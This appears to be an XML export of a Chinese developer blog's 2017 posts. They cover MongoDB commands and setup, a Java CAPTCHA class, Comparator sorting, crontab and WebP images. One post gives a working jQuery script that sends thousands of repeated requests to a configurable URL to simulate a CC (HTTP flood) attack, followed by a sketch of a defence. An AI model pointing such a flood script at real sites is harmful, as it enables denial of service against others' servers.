    <title><![CDATA[MongoDB (三)：基本命令操作]]></title>
    <url>%2Fblog%2F2017%2F10%2F23%2FMongoDB%20(%E4%B8%89)%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[MongoDB 的基本操作数据库的一些常用命令1、显示所有数据库1show dbs 2、使用数据库,当没有这个数据库时，mongodb 会在需要的时候帮你创建1use demo 3、删除数据库1db.dropDatabase() 一、插入数据1、往集合test插入单条数据1db.test.insert(&#123;url:&quot;http://www.lrshuai.top&quot;&#125;) 2、往集合test插入多条数据，可通过for 循环1for(i=1;i&lt;11;i++)db.test.insert(&#123;name:&quot;lrshuai&quot;,age:23,num:i&#125;) 插入数据时，会指定一个唯一不重复的 _id 字段,这个字段用户可以指定，但不能重复，当重复是报异常：E11000 duplicate key error collection.save操作和insert操作区别在于当遇到_id相同的情况下, save完成保存操作,存在则替换二、查询数据1、查询test 集合的所有数据1db.test.find() 2、查询 test 集合 name为lrshuai 的数据1db.test.find(&#123;name:&quot;lrshuai&quot;&#125;) 三、更新数据参数详解 参数 说明 参数一 query 查询要更新的条件 参数二 update 修改的内容 参数三 upsert 可选， 值默认为false——未找到匹配时不插入新记录 参数四 multi——可选 ，更新满足查询条件的多条记录 参数五 writeConcern 可选，抛出异常的级别 1、更改name 为 test ,当num 等于1 的时候，但这样的操作会把其他属性给删除掉。1db.test.update(&#123;num:1&#125;,&#123;name:&quot;test&quot;&#125;) 2、更改name 为test ,当num 等于1 的时候，只修改一个属性，其他属性不动,加 $set:1db.test.update(&#123;num:1&#125;,&#123;$set:&#123;name:&quot;test&quot;&#125;&#125;) 3、当修改不存在的数据时,自动添加修改的数据。第三个参数 设置为true1db.test.update(&#123;num:1&#125;,&#123;name:&quot;test&quot;&#125;,true) 4、修改满足条件的所有数据1db.test.update(&#123;num:1&#125;,&#123;name:&quot;test&quot;&#125;,false,true) 四、删除数据1、删除 test 集合中name 为lrshuai 的所有数据1db.test.remove(&#123;name:&quot;lrshuai&quot;&#125;) 2、删除test 的集合1db.test.drop()]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB (二)：搭建MongoDB 服务]]></title>
    <url>%2Fblog%2F2017%2F10%2F23%2FMongoDB%20(%E4%BA%8C)%EF%BC%9A%E6%90%AD%E5%BB%BAMongoDB%20%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[上次已经讲了安装，且启动了默认的配置现在我们就来手动的配置下一、创建服务器所在目录1mkdir -p /data/mongodb 二、创建数据所在目录123456# 数据存放目录mkdir -p /data/mongodb/data# 生成log目录mkdir -p /data/mongodb/log# 配置文件目录mkdir -p /data/mongodb/conf 三、创建配置文件1vim /data/mongodb/conf/mongod.conf 添加如下内容：123456# 启动端口 27017 是默认的端口，可以改port = 27017dbpath = /data/mongodb/datalogpath=/data/mongodb/log/mongo.log# 是否后台启动fork = true 四、启动12# 我这是配过环境变量的，所以可以在什么地方都可以执行，没有配，请到mongodb 的bin目录下执行mongod -f /data/mongodb/conf/mongod.conf 五、添加自启动服务器重启每次都要手动启动mongodb，很麻烦，那就给它自启动吧编辑 /etc/rc.local 在最后加上：1/usr/local/mongodb/bin/mongod -f /data/mongodb/conf/mongod.conf]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB (一)：安装MongoDB]]></title>
    <url>%2Fblog%2F2017%2F10%2F23%2FMongoDB%20(%E4%B8%80)%EF%BC%9A%E5%AE%89%E8%A3%85MongoDB%2F</url>
    <content type="text"><![CDATA[Linux 简单搭建mongodb 我以 centos 为例 一、下载源码包去官网下载源码包：https://www.mongodb.com/download-center#community12# 下载对应你版本号的包，我这个是红帽的wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-rhel70-3.4.9.tgz 二、解压我直接解压到 /usr/local 下123tar -zxvf mongodb-linux-x86_64-rhel70-3.4.9.tgz -C /usr/local/# 重命名为 mongodbmv mongodb-linux-x86_64-rhel70-3.4.9 mongodb 三、配置环境变量（可选）配置环境变量是为了启动的时候，都不用去mongodb 的bin 目录下启动。在 /etc/profile 加入如下代码：1234# MONGODB_HOME 就是你解压到的地方路径MONGODB_HOME=/usr/local/mongodb# 添加进 path 路径export PATH=$&#123;MONGODB_HOME&#125;/bin:$PATH 四、创建数据存贮 目录MongoDB的数据存储在data目录的db目录下，但是这个目录在安装过程不会自动创建，所以你需要手动创建data目录，并在data目录中创建db目录。以下实例中我们将data目录创建于根目录下(/)。注意：/data/db 是 MongoDB 默认的启动的数据库路径(–dbpath)。12# -p 递归创建目录mkdir -p /data/db 五、启动1234# 如果按上面的配置，--dbpath 这个参数可不加。mongod --dbpath=/data/db &amp;# 连接 mongodbmongo 顺便说一下，就是启动的时候有几个警告1231、 读写没有限制2、 使用root用户3、 建议使用 numactl –interleave选项 一般开启权限认证和创建用户，这些警告就都消失了。比如下方的连接方式12//对admin 数据库进行权限认证mongo -port 27017 -u &quot;yourUsername&quot; -p &quot;youPassword&quot; --authenticationDatabase &quot;admin&quot;]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分享一个后台管理系统]]></title>
    <url>%2Fblog%2F2017%2F10%2F19%2F%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[一个基于SpringBoot + AdminLTE 的后台模板上次闲于的时间做的一个基本后台框架，偶然在CSDN 上传一下，发现有好多人下载的。所以就写这篇文章吧，让更多的人看到。哈哈后台介绍：一、菜单管理：二、角色管理：三、用户管理：每个管理下都有增删改查的操作。权限有四种：增删改查。每个用户可以拥有多个角色，权限取角色的并集权限。菜单可添加根菜单和子菜单。权限的算法是用到了BigInteger的权限判断 setBit()与testBit() 方法。废话那么多，你可能也听不懂，直接放张图可能比较有效果。 我发现好多人下载之后，反馈运行报错：redis 惹的祸。简单的解决方案：安装redis####下载链接：https://github.com/MicrosoftArchive/redis/releases linux 的下载tar.gz，windows 的下载zip 或者 msi Github 地址：https://github.com/rstyro/admin]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>干货</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分享一个Java生成验证码工具类]]></title>
    <url>%2Fblog%2F2017%2F10%2F18%2F%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AAJava%E7%94%9F%E6%88%90%E9%AA%8C%E8%AF%81%E7%A0%81%E5%B7%A5%E5%85%B7%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[分享一个Java生成验证码工具类直接上代码：1、CodeUtil.class123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152package top.lrshuai.blog.util;import java.awt.BasicStroke;import java.awt.Color;import java.awt.Font;import java.awt.Graphics2D;import java.awt.image.BufferedImage;import java.util.Random;/** * 验证码工具类 * */public class CodeUtil &#123; private static final String[] CODE = &#123; "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9" &#125;; /** * 生成验证码图片 * * @return obj[0]: 图片; obj[1]:字符串 */ public static Object[] CreateCode() &#123; int imgW = 120; int imgH = 42; int r, g, b; Color color; String result = ""; Random random = new Random(); BufferedImage img = new BufferedImage(imgW, imgH, BufferedImage.TYPE_INT_RGB); Graphics2D graphics = img.createGraphics(); graphics.setFont(new Font("MicroSoft YaHei", Font.PLAIN, 30)); // 绘制背景色 r = random.nextInt(20) + 230; g = random.nextInt(20) + 230; b = random.nextInt(20) + 230; color = new Color(r, g, b); graphics.setColor(color); graphics.fillRect(0, 0, imgW, imgH); // 绘制背景干扰线条 for (int i = 0; i &lt; 3; i++) &#123; r = random.nextInt(50) + 200; g = random.nextInt(50) + 200; b = random.nextInt(50) + 200; color = new Color(r, g, b); graphics.setColor(color); graphics.setStroke(new BasicStroke(2.0f)); graphics.drawLine(random.nextInt(20), random.nextInt(imgH), random.nextInt(20) + 80, random.nextInt(imgH)); &#125; if (random.nextInt(100) &gt;= 50) &#123; // 绘制字符串验证码 for (int i = 0; i &lt; 4; i++) &#123; String str = CODE[random.nextInt(CODE.length)]; r = random.nextInt(180) + 50; g = random.nextInt(180) + 50; b = random.nextInt(180) + 50; color = new Color(r, g, b); graphics.setColor(color); graphics.drawString(str, (i * 20) + 20, random.nextInt(4) + 30); result += str; &#125; &#125; else &#123; // 绘制计算题验证码 int is = random.nextInt(100); int num1 = 0, num2 = 0; if (is &gt;= 50) &#123; // 加法 r = random.nextInt(180) + 50; g = random.nextInt(180) + 50; b = random.nextInt(180) + 50; color = new Color(r, g, b); graphics.setColor(color); num1 = random.nextInt(9) + 1; graphics.drawString(num1 + "", 20, random.nextInt(4) + 30); r = random.nextInt(180) + 50; g = random.nextInt(180) + 50; b = random.nextInt(180) + 50; color = new Color(r, g, b); graphics.setColor(color); graphics.drawString("+", 40, random.nextInt(4) + 30); r = random.nextInt(180) + 50; g = random.nextInt(180) + 50; b = random.nextInt(180) + 50; color = new Color(r, g, b); graphics.setColor(color); num2 = random.nextInt(9) + 1; graphics.drawString(num2 + "", 60, random.nextInt(4) + 30); r = random.nextInt(180) + 50; g = random.nextInt(180) + 50; b = random.nextInt(180) + 50; color = new Color(r, g, b); graphics.setColor(color); graphics.drawString("=", 80, random.nextInt(4) + 30); result = (num1 + num2) + ""; &#125; else &#123; // 乘法 r = random.nextInt(180) + 50; g = random.nextInt(180) + 50; b = random.nextInt(180) + 50; color = new Color(r, g, b); graphics.setColor(color); num1 = random.nextInt(9) + 1; graphics.drawString(num1 + "", 20, random.nextInt(4) + 30); r = random.nextInt(180) + 50; g = random.nextInt(180) + 50; b = random.nextInt(180) + 50; color = new Color(r, g, b); graphics.setColor(color); graphics.drawString("×", 40, random.nextInt(4) + 30); r = random.nextInt(180) + 50; g = random.nextInt(180) + 50; b = random.nextInt(180) + 50; color = new Color(r, g, b); graphics.setColor(color); num2 = random.nextInt(9) + 1; graphics.drawString(num2 + "", 60, random.nextInt(4) + 30); r = random.nextInt(180) + 50; g = random.nextInt(180) + 50; b = random.nextInt(180) + 50; color = new Color(r, g, b); graphics.setColor(color); graphics.drawString("=", 80, random.nextInt(4) + 30); result = (num1 * num2) + ""; &#125; &#125; // 绘制前景干扰线条 for (int i = 0; i &lt; 3; i++) &#123; r = random.nextInt(50) + 200; g = random.nextInt(50) + 200; b = random.nextInt(50) + 200; color = new Color(r, g, b); graphics.setColor(color); graphics.setStroke(new BasicStroke(1.0f)); graphics.drawLine(0, random.nextInt(imgH), imgW, random.nextInt(imgH)); &#125; return new Object[] &#123; img, result &#125;; &#125;&#125; 2、controller 请求123456789101112131415161718192021222324252627282930313233/*** 生成验证码* @throws IOException */@GetMapping(value = &quot;/code&quot;)public String getCode(HttpServletResponse response)&#123; OutputStream os = null; try &#123; // 获取图片 Object[] img = CodeUtil.CreateCode(); System.out.println(&quot;code=&quot;+img[1].toString()); BufferedImage image = (BufferedImage) img[0]; // 输出到浏览器 response.setContentType(&quot;image/png&quot;); os = response.getOutputStream(); ImageIO.write(image, &quot;png&quot;, os); os.flush(); // 用于验证的字符串存入session this.getSession().setAttribute(Const.AUTH_CODE, img[1].toString()); &#125; catch (IOException e) &#123; log.error(&quot;验证码输出异常&quot;,e); &#125;finally &#123; if(os != null) &#123; try &#123; os.close(); &#125; catch (IOException e) &#123; System.out.println(&quot;close error&quot;); e.printStackTrace(); &#125; &#125; &#125; return null;&#125; 3、html 页面调用123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta content=&quot;width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no&quot; name=&quot;viewport&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;img id=&quot;authCode&quot; onclick=&quot;changeCode()&quot; src=&quot;/code&quot; alt=&quot;验证码&quot; title=&quot;点击更换&quot; /&gt;&lt;script&gt;function changeCode() &#123; document.getElementById(&quot;authCode&quot;).src = &quot;/code?t=&quot; + genTimestamp();&#125;function genTimestamp() &#123; var time = new Date(); return time.getTime();&#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Comparator 实现自定义排序]]></title>
    <url>%2Fblog%2F2017%2F10%2F18%2FComparator%20%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[java 利用Comparator 实现自定义排序Comparator 是一个java.util 包下的接口，它提供一个compare() 方法让我们来自己实现排序方式废话不多说，看demo,demo就是最好的文档。第一种方式：实现Comparable 接口，重写compareTo 方法，然后调用Collections.sort(list) 方法即可1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283package top.lrshuai.blog.util;import java.util.ArrayList;import java.util.Collections;import java.util.List;/** * 玩家类 * @author 帅大叔 * */public class Player implements Comparable&lt;Player&gt;&#123; private String userId; private String userName; private int level; public String getUserId() &#123; return userId; &#125; public void setUserId(String userId) &#123; this.userId = userId; &#125; public String getUserName() &#123; return userName; &#125; public void setUserName(String userName) &#123; this.userName = userName; &#125; public int getLevel() &#123; return level; &#125; public void setLevel(int level) &#123; this.level = level; &#125; public Player() &#123; super(); // TODO Auto-generated constructor stub &#125; public Player(String userId, String userName, int level) &#123; super(); this.userId = userId; this.userName = userName; this.level = level; &#125; @Override public String toString() &#123; return &quot;Player [userId=&quot; + userId + &quot;, userName=&quot; + userName + &quot;, level=&quot; + level + &quot;]&quot;; &#125; @Override public int compareTo(Player o) &#123; if (this.getLevel() &lt; o.getLevel()) return 1; else if(this.getLevel() &gt; o.getLevel())&#123; return -1; &#125;else&#123; return this.getUserName().compareTo(o.getUserName()); &#125; &#125; public static void main(String[] args) &#123; List&lt;Player&gt; playerList = new ArrayList&lt;&gt;(); Player p1 = new Player(&quot;p1&quot;, &quot;abc&quot;, 1); Player p2 = new Player(&quot;p2&quot;, &quot;def&quot;, 2); Player p3 = new Player(&quot;p3&quot;, &quot;efg&quot;, 5); Player p4 = new Player(&quot;p4&quot;, &quot;bcd&quot;, 3); playerList.add(p1); playerList.add(p2); playerList.add(p3); playerList.add(p4); //排序，会按照Player类中的compareTo 方式来排序 Collections.sort(playerList); System.out.println(playerList); &#125; &#125;//打印结果/*[Player [userId=p3, userName=efg, level=5],Player [userId=p4, userName=bcd, level=3],Player [userId=p2, userName=def, level=2],Player [userId=p1, userName=abc, level=1]]*/ 第二种方式：不用实现Comparable 接口，但在排序的时候在实现Comparable 接口12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485package top.lrshuai.blog.util;import java.util.ArrayList;import java.util.Collections;import java.util.Comparator;import java.util.List;/** * 玩家类 * @author 帅大叔 * */public class Player&#123; private String userId; private String userName; private int level; public String getUserId() &#123; return userId; &#125; public void setUserId(String userId) &#123; this.userId = userId; &#125; public String getUserName() &#123; return userName; &#125; public void setUserName(String userName) &#123; this.userName = userName; &#125; public int getLevel() &#123; return level; &#125; public void setLevel(int level) &#123; this.level = level; &#125; public Player() &#123; super(); // TODO Auto-generated constructor stub &#125; public Player(String userId, String userName, int level) &#123; super(); this.userId = userId; this.userName = userName; this.level = level; &#125; @Override public String toString() &#123; return &quot;Player [userId=&quot; + userId + &quot;, userName=&quot; + userName + &quot;, level=&quot; + level + &quot;]&quot;; &#125; public static void main(String[] args) &#123; List&lt;Player&gt; playerList = new ArrayList&lt;&gt;(); Player p1 = new Player(&quot;p1&quot;, &quot;abc&quot;, 1); Player p2 = new Player(&quot;p2&quot;, &quot;def&quot;, 2); Player p3 = new Player(&quot;p3&quot;, &quot;efg&quot;, 5); Player p4 = new Player(&quot;p4&quot;, &quot;bcd&quot;, 3); playerList.add(p1); playerList.add(p2); playerList.add(p3); playerList.add(p4); //自己实现排序方式 Collections.sort(playerList, new Comparator&lt;Player&gt;() &#123; @Override public int compare(Player o1, Player o2) &#123; if (o1.getLevel() &lt; o2.getLevel()) return 1; else if(o1.getLevel() &gt; o2.getLevel())&#123; return -1; &#125;else&#123; // 这个是按照userName 升序,首字母小的在前 return o1.getUserName().compareTo(o2.getUserName()); &#125; &#125; &#125;);; System.out.println(playerList); &#125; &#125;//打印结果/*[Player [userId=p3, userName=efg, level=5],Player [userId=p4, userName=bcd, level=3],Player [userId=p2, userName=def, level=2],Player [userId=p1, userName=abc, level=1]]*/ 总结：一、上面的排序方式都是：按照level 降序排序，其次按照 userName 升序，如果你有多个参数比较就在compare 里继续在else 里写就可以了。二、关于return 的问题1、int 类型的比较123456return o1.getLevel() &lt; o2.getLevel() ? 1:-1; //这个是按照 Level 降序排序（大到小）return o1.getLevel() &gt; o2.getLevel() ? 1:-1; //这个是按照 Level 升序序排序（小到大）// 可以这么理解 1 相当于true 。前面是升序，后面是降序，谁大谁说话// 如果后面的比前面的大，return 1。就是按后面的排序，所以就是降序// 如果后面的比前面的小，return 1，前面的大，前面才是老大，就是按前面的排序，所以就是升序 2、string 类型的比较1234// 可以这么理解，compare(参数1，参数2)// 参数1 是升序，参数2 是降序// o1.getUserName().compareTo(o2.getUserName()) o1 在前，所以按o1 的排序，而o1 是参数1，所以是升序// o2.getUserName().compareTo(o1.getUserName()) o2 在前，所以按o2 的排序，而o2 是参数2，所以是降序 正文到此结束，觉得有用，何不点个赞呢！]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[虚拟机安装系统无缝全过程]]></title>
    <url>%2Fblog%2F2017%2F10%2F17%2F%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E7%B3%BB%E7%BB%9F%E6%97%A0%E7%BC%9D%E5%85%A8%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[虚拟机安装系统无间隙全过程突然发现有好多朋友，都不怎么会用虚拟机安装系统，所以就有了这个教程。一、准备工作：1、你已经安装了虚拟机2、准备一个镜像（iso,或者img 格式的，我这里演示img 格式的，因为有些朋友说不会安装img 格式的。但其实原理都一样）题外话：下载windows 系统，推荐网址 MSDN,我告诉你 windows 的所有版本它几乎都有：https://msdn.itellyou.cn/二、新建虚拟机打开你的虚拟机，然后直接上图： 上面的演示是安装windows xp pro img格式的接下来回车 之后就开始安装系统了，安装window 都是挺简单的，按照它的提示就可以了，我这里就不详细阐述了。安装其他的系统，也是这个操作。]]></content>
      <categories>
        <category>网络运维</category>
      </categories>
      <tags>
        <tag>系统装机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Crontab 命令详解]]></title>
    <url>%2Fblog%2F2017%2F10%2F16%2FCrontab%20%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Crontab 概念crontab命令常见于Unix和类Unix的操作系统之中，用于设置周期性被执行的指令。该命令从标准输入设备读取指令，并将其存放于“crontab”文件中（是“cron table”的简写），以供之后读取和执行。该词来源于希腊语 chronos(χρνο)，原意是时间。通常，crontab储存的指令被守护进程激活， crond常常在后台运行，每一分钟检查是否有预定的作业需要执行。这类作业一般称为cron jobs。 简单点说：就是和闹钟的概念类似。就是定时执行 一、检查 crontab 服务是否安装下面的命令 如果显示 ‘no crontab for root’ 或者 显示当前的任务列表 或者 不报错 那说明已经安装，1crontab -l 1、如果没有安装 cron 服务Contos1yum -y install vixie-cron crontabs ubuntu1apt-get install cron 2、cron 服务的启动与关闭Contos1234567891011# 查看cond 状态service crond status# 启动cronservice crond start# 关闭cronservice crond stop# 重启cronservice crond restart Ubuntu1234567891011# 查看cond 状态service cron status# 启动cronservice cron start# 关闭cronservice cron stop# 重启cronservice cron restart 二、crontab 命令1．命令格式：12crontab [-u user] filecrontab [-u user] [ -e | -l | -r ] 2．命令功能：1通过crontab 命令，我们可以在固定的间隔时间执行指定的系统指令或 shell script脚本。时间间隔的单位可以是分钟、小时、日、月、周及以上的任意组合。这个命令非常设合周期性的日志分析或数据备份等工作。 3．命令参数：123456-u user：用来设定某个用户的crontab服务，例如，“-u ixdba”表示设定ixdba用户的crontab服务，此参数一般有root用户来运行。file：file是命令文件的名字,表示将file做为crontab的任务列表文件并载入crontab。如果在命令行中没有指定这个文件，crontab命令将接受标准输入（键盘）上键入的命令，并将它们载入crontab。-e：编辑某个用户的crontab文件内容。如果不指定用户，则表示编辑当前用户的crontab文件。-l：显示某个用户的crontab文件内容，如果不指定用户，则表示显示当前用户的crontab文件内容。-r：从/var/spool/cron目录中删除某个用户的crontab文件，如果不指定用户，则默认删除当前用户的crontab文件。-i：在删除用户的crontab文件时给确认提示。 4、crontab 文件格式每一行都代表一项任务，每行的每个字段代表一项设置，它的格式共分为六个字段，前五段是时间设定段，第六段是要执行的命令段，格式如下：123456789101112minute hour day month week command# For details see man 4 crontabs# Example of job definition:.---------------------------------- minute (0 - 59) 表示分钟| .------------------------------- hour (0 - 23) 表示小时| | .---------------------------- day of month (1 - 31) 表示日期| | | .------------------------- month (1 - 12) OR jan,feb,mar,apr ... 表示月份| | | | .---------------------- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat 表示星期（0 或 7 表示星期天）| | | | | .------------------- username 以哪个用户来执行 | | | | | | .------ command 要执行的命令，可以是系统命令，也可以是自己编写的脚本文件| | | | | | |* * * * * user-name command to be executed 格式示例： 格式 说明 */1 * * * * service httpd restart 每一分钟 重启httpd服务 0 */1 * * * service httpd restart 每一小时 重启httpd服务 30 21 * * * service httpd restart 每天 21：30 分 重启httpd服务 26 4 1,5,23,28 * * service httpd restart 每月的1号，5号 23 号 28 号 的4点26分，重启httpd服务 26 4 1-21 * * service httpd restart 每月的1号到21号 的4点26分，重启httpd服务 */2 * * * * service httpd restart 每隔两分钟 执行，偶数分钟 重启httpd服务 1-59/2 * * * * service httpd restart 每隔两分钟 执行，奇数 重启httpd服务 0 23-7/1 * * * service httpd restart 每天的晚上11点到早上7点 每隔一个小时 重启httpd服务 0,30 18-23 * * * service httpd restart 每天18点到23点 每隔30分钟 重启httpd服务 0-59/30 18-23 * * * service httpd restart 每天18点到23点 每隔30分钟 重启httpd服务 59 1 1-7 4 * test &#39;date +\%w&#39; -eq 0 &amp;&amp; /root/a.sh 四月的第一个星期日 01:59 分运行脚本 /root/a.sh ，命令中的 test是判断，%w是数字的星期几 5、小结： *表示任何时候都匹配 &quot;a,b,c&quot; 表示a 或者 b 或者c 执行命令 &quot;a-b&quot; 表示a到b 之间 执行命令 &quot;*/a&quot; 表示每 a分钟(小时等) 执行一次 crontab 不能编辑系统级的 任务 其他需求 : crontab 最小执行时间是分钟，如果是需要 半分钟执行，如果实现呢？，看如下：每30秒 把时间写入 /tmp/cron.txt 文件12*/1 * * * * data &gt;&gt; /tmp/cron.txt*/1 * * * * sleep 30s;data &gt;&gt; /tmp/cron.txt 三、crontab 的配置文件 文件 说明 /etc/crontab 全局配置文件 /etc/cron.d 这个目录用来存放任何要执行的crontab文件或脚本 /etc/cron.deny 该文件中所列用户不允许使用crontab命令 /etc/cron.allow 该文件中所列用户允许使用crontab命令 /var/spool/cron/ 所有用户crontab文件存放的目录,以用户名命名，比如你是root 用户，那么当你添加任务是，就会在该路径下有一个root文件。 /etc/cron.deny 该文件中所列用户不允许使用crontab命令 /var/log/cron crontab 的日志文件 四、注意事项1、环境变量环境变量的值，在crontab 文件中获取不到，所以要注意，可以写脚本2、%在crontab中%是有特殊含义的，表示换行的意思。如果要用的话必须进行转义\%1`59 1 1-7 4 * test &apos;date +\%w&apos; -eq 0 &amp;&amp; /root/a.sh ` 正文到此结束，如果觉得有用，点个赞可否！！！！！]]></content>
      <categories>
        <category>网络运维</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javascript 模拟CC攻击与防范浅析]]></title>
    <url>%2Fblog%2F2017%2F10%2F15%2FJavascript%20%E6%A8%A1%E6%8B%9FCC%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E8%8C%83%E6%B5%85%E6%9E%90%2F</url>
    <content type="text"><![CDATA[CC攻击的原理与防范浅析本人菜鸟一枚，如果说得不对，请见谅，欢迎指正。一、CC攻击的原理：CC攻击的原理就是攻击者控制某些主机不停地发大量数据包给对方服务器造成服务器资源耗尽，一直到宕机崩溃。CC主要是用来攻击页面的，每个人都有这样 的体验：当一个网页访问的人数特别多的时候，打开网页就慢了，CC就是模拟多个用户(多少线程就是多少用户)不停地进行访问那些需要大量数据操作(就是需 要大量CPU时间)的页面，造成服务器资源的浪费，CPU长时间处于100%，永远都有处理不完的连接直至就网络拥塞，正常的访问被中止。二、Js 模拟CC 攻击CC攻击的种类有三种，直接攻击、代理攻击、僵尸网络攻击我们就来简单的模拟一下，我这种算是 直接攻击记住这个只是：简单模拟，简单模拟，简单模拟。我就一台电脑，没肉鸡。 js 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot; /&gt;&lt;script src=&quot;http://libs.baidu.com/jquery/1.7.2/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;发送请求数：&lt;span id=&quot;requestNum&quot;&gt;0&lt;/span&gt;&lt;/h1&gt;&lt;script&gt;var i=0;var task=&quot;&quot;;//攻击次数var attackNum = 10000;//攻击地址var url=&quot;http://127.0.0.1/blog&quot;;//隔几毫秒攻击一次var time=100;$(document).ready(function()&#123; task = setInterval(&quot;MainTask()&quot;,time);&#125;)function MainTask()&#123; i++; sendRequest(i); addNum(i); if(i &gt; attackNum)&#123; clearInterval(task); &#125;&#125;function sendRequest(i)&#123; console.log(&quot;send&quot;,i); $.ajax(&#123; type:&quot;get&quot;, url:url, cache:false, dataType:&quot;json&quot;, data:&#123;&#125;, success:function(data)&#123; console.log(&quot;result-text:&quot;,data); &#125; &#125;);&#125;function addNum(num)&#123; $(&quot;#requestNum&quot;).text(num);&#125;&lt;/script&gt;&lt;/html&gt; 这只是简单的模拟，现实中不会那么简单，用本机攻击是可以追踪到你的ip，所以大部分都是通过代理或者肉鸡，进行攻击。ajax 可以不显示回调，不然会耗自己的带宽，我这里简单的模拟。而且现实中还有跨越问题等东西。 三、防御浅析思路：利用拦截器，拦截所有请求，统计单位时间内，单个IP访问的次数。如果访问次数超过你限制的数量，直接拉到黑名单。下次不给访问。统计个数可以用redis来实现，黑名单可以放在数据库，也可直接放缓存。最后就是放数据库，然后服务器启动时，把黑名单缓存起来。springboot 拦截器 和 springboot 操作redis 我都有相对应的文章 与，源码示例，在博客可以搜 springboot 或者点击springboot 标签防御的具体实现代码，我就不说，这小防御代码挺简单的。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>干货</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网页使用WebP格式图片与图片压缩]]></title>
    <url>%2Fblog%2F2017%2F10%2F14%2F%E7%BD%91%E9%A1%B5%E4%BD%BF%E7%94%A8WebP%E6%A0%BC%E5%BC%8F%E5%9B%BE%E7%89%87%E4%B8%8E%E5%9B%BE%E7%89%87%E5%8E%8B%E7%BC%A9%2F</url>
    <content type="text"><![CDATA[一、WebPWebP是Google开发的一种新的图片格式，它支持有损压缩、无损压缩和透明度，压缩后的文件大小比JPEG、PNG等都要小。所以可以节省带宽，减少页面载入时间，节省用户的流量。所以网页使用webp 格式的图片是一个很好的方案。但可惜的是 不是所有的浏览器都兼容，目前只有Chrome、Opera浏览器 兼容。解决方法：1、让能兼容webp 的使用webp格式，不能兼容的就用普通格式。这就用到html5 的新标签 &lt;picture&gt; &lt;picture&gt;它允许在其内部设置多个&lt;source&gt;标签，以指定不同的图像文件名，根据不同的条件进行加载； 1234&lt;picture class=&quot;picture&quot;&gt; &lt;source type=&quot;image/webp&quot; srcset=&quot;image.webp&quot;&gt; &lt;img class=&quot;image&quot; src=&quot;image.jpg&quot;&gt;&lt;/picture&gt; 上面的代码: 如果浏览器支持WebP格式，就会加载image.webp，否则会加载image.jpg。2、在线图片转换为webp格式地址:https://www.upyun.com/webp二、图片压缩网站图片太大，影响访问速度，那就压一下把。下面介绍几个网址：1、TinyPNG2、ImageOptim3、RIOT暂时就这几个吧，哪天发现其他的再补充！！]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>干货</tag>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分享一个图片工具类]]></title>
    <url>%2Fblog%2F2017%2F10%2F14%2F%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E5%9B%BE%E7%89%87%E5%B7%A5%E5%85%B7%E7%B1%BB%2F</url>
